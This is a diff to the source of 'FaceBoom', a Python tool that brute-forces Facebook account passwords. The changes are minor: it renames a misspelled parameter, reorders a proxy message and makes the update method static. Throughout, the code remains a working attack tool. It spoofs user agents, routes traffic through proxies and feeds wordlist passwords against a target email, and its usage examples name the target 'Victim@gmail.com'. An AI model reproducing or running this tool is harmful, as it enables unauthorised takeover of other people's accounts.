@@ -1,3 +1,4 @@
+#!/usr/bin/python
 import socket, sys, os, re, random, optparse, time
 if sys.version_info.major <= 2:import httplib
 else:import http.client as httplib
@@ -32,7 +33,7 @@ except ImportError:
 class FaceBoom(object):
 
 
-    def __init__(self, target=None, target_profile=None,singal_passwd=None, wordlist=None, proxy=None, update=False):
+    def __init__(self, target=None, target_profile=None,single_passwd=None, wordlist=None, proxy=None, update=False):
 
         self.br = mechanize.Browser()
         self.br.set_handle_robots(False)
@@ -40,7 +41,7 @@ class FaceBoom(object):
         self.br.addheaders=[('User-agent',self.get_random_user_agent())]
         self.target = target
         self.target_profile = target_profile
-        self.singal_passwd = singal_passwd
+        self.single_passwd = single_passwd
         self.wordlist = wordlist
         self.proxy = proxy
         self.useProxy = False
@@ -53,12 +54,11 @@ class FaceBoom(object):
             errMsg("Please Check Your Internet Connection")
             sys.exit(1)
         if self.proxy:
-             print(wi+"["+yl+"~"+wi+"] Connecting To "+wi+"Proxy[\033[1;33m {} \033[1;37m]...".format(self.proxy if not ":" in self.proxy else self.proxy.split(":")[0]))
              if self.proxy.count(".") != 3:
                     errMsg("Invalid IPv4 ["+rd+str(self.proxy)+yl+"]")
                     sys.exit(1)
+             print(wi+"["+yl+"~"+wi+"] Connecting To "+wi+"Proxy[\033[1;33m {} \033[1;37m]...".format(self.proxy if not ":" in self.proxy else self.proxy.split(":")[0]))
              check = self.proxy+":8080" if not ":" in self.proxy else self.proxy
-             print("check", check)
              if self.check_proxy(check):
                 print(wi+"["+gr+"Connected"+wi+"]")
                 self.useProxy = check
@@ -129,17 +129,17 @@ class FaceBoom(object):
 [---]         """+yl+"""CONFIG"""+gr+"""         [---]
 ==================================
 [>] Target      :> """+wi+self.target+gr+"""
-{}""".format("[>] Wordlist    :> "+yl+str(self.wordlist) if not self.singal_passwd else "[>] Password    :> "+yl+str(self.singal_passwd))+gr+"""
+{}""".format("[>] Wordlist    :> "+yl+str(self.wordlist) if not self.single_passwd else "[>] Password    :> "+yl+str(self.single_passwd))+gr+"""
 [>] ProxyStatus :> """+str(proxystatus)+wi)
-        if not self.singal_passwd:
+        if not self.single_passwd:
             print(gr+"""\
 =================================="""+wi+"""
 [~] """+yl+"""Brute"""+rd+""" ForceATTACK: """+gr+"""Enabled """+wi+"""[~]"""+gr+"""
 ==================================\n"""+wi)
 
 
-    def updateFaceBoom(self):
-
+    @staticmethod
+    def updateFaceBoom():
         write("[~] Checking for updates...\n")
         conn = httplib.HTTPSConnection("raw.githubusercontent.com")
         conn.request("GET", "/Oseid/Facebom/master/core/version.txt")
@@ -165,8 +165,8 @@ class FaceBoom(object):
             sys.exit(1)
         if self.target:
             self.banner()
-            if self.singal_passwd:
-                passwd = self.singal_passwd.strip()
+            if self.single_passwd:
+                passwd = self.single_passwd.strip()
                 if len(passwd) <6:
                     errMsg("Invalid Password")
                     sys.exit(1)
@@ -245,7 +245,7 @@ Examples:
      |--------
      | python facebom.py -t Victim@gmail.com -s 1234567
      |--------
-     | python facebom.py -g https://www.facebook.com/alanwalker97
+     | python facebom.py -g https://www.facebook.com/Victim_Profile
      |--------
 """)
 
@@ -269,11 +269,11 @@ def Main():
        FBOM = FaceBoom(target=options.taremail, wordlist=options.wlst, proxy=options.proxy)
        FBOM.start()
    elif options.taremail !=None and options.single !=None and options.proxy !=None:
-       FBOM = FaceBoom(target=options.taremail, singal_passwd=options.single, proxy=options.proxy)
+       FBOM = FaceBoom(target=options.taremail, single_passwd=options.single, proxy=options.proxy)
        FBOM.start()
 
    elif options.taremail !=None and options.single !=None:
-       FBOM = FaceBoom(target=options.taremail,singal_passwd=options.single)
+       FBOM = FaceBoom(target=options.taremail,single_passwd=options.single)
        FBOM.start()
    elif options.taremail !=None and options.wlst !=None:
        FBOM = FaceBoom(target=options.taremail, wordlist=options.wlst)
